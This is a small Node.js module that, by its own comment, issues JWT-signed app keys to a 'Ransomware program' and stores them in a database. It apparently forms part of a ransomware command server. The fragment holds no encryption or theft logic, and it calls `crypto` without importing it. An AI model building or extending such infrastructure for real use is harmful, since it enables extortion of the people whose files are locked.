'use strict'

const App = require('./schemas/app');
const Key = require('./schemas/key');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const config = JSON.parse(fs.readFileSync('/home/ubuntu/nodeServer/config/config.json', 'utf-8'));

const genToken = function(data) {
	return jwt.sign(data, config.secret);
};

const generateAppKey = function(req, res) {
	//Generate an app key to send to the Ransomware program
	let genAppKey = crypto.randomBytes(20).toString('hex');
	//Create the JWT token
	let token = genToken({appKey: genAppKey});
	//Store the App key into the database
	let appData = {
		appKey: genAppKey
	};
	App.create(appData, function(err, user) {
		if(err) {
			res.status = 401;
			return res.json({message: err.message});
		} else {
			//Successfully store the token into the database
			return res.json({'token': token});
		}
	});
};

module.exports = {
	generateAppKey
};
